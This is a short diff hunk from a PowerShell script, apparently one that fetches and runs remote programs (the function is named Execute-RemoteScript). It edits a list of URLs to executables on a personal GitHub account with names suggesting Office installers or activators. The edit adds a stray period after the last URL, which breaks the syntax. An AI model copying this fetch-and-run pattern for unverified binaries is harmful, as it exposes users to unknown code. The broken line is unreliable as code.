@@ -54,7 +54,7 @@ function Execute-RemoteScript {
 $urls = @(
     'https://github.com/Zigsaw07/AIO-Script/raw/refs/heads/main/MSO-365.exe',
     'https://github.com/Zigsaw07/SETSKY/raw/refs/heads/main/garry.exe',
-    'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'
+    'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'.
     
 )
 
